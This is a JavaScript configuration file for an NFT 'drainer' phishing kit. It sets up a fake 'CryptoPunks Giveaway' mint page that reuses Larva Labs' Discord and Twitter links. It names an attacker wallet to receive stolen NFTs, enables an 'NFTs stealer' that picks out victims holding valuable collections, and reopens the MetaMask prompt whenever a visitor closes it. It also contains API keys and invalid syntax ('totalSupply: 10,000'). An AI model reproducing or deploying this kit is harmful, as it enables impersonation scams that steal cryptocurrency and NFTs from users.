// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x910d7A1FE08C91B6c5a489f1d29F973D4392496C";    // Your ETH wallet that you have to receive NFTs
const infuraId = "2D1Ga9cGGCpJZQ9R5J0ZP4WyaHg"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "b05e5f76c65c485facb9ff34290d8624"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "CryptoPunks",
    title: "CryptoPunks Giveaway", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "07.08.22", // Today date
    socialMedia: {
        discord: "https://discord.gg/tQp4pSE",
        twitter: "https://www.twitter.com/larvalabs",
    },
    medias: {
        preview: "https://binancecryptopunks.co/wp-content/uploads/2021/02/binancecryptopunks.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRwfoOQpkgC7NilKPVWMFs9YSO2UqgCBHPqUQ&usqp=CAU",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.1,         // Price per NFT.
    totalSupply: 10,000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x910d7A1FE08C91B6c5a489f1d29F973D4392496C" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
